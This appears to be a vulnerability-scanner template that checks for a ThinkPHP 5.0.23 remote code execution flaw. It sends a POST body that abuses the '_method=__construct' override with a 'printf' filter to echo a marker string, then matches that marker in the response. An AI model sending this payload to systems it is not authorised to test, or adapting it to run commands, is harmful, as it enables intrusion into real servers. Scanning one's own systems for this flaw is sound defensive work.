{
    "Name": "thinkphp5023-method-rce.yml",
    "Description": "thinkphp5023-method-rce.yml",
    "Product": "thinkphp",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"application/x-www-form-urlencoded"},
        "Uri":"/index.php?s=captcha",
        "Port":"",
        "Data":"_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
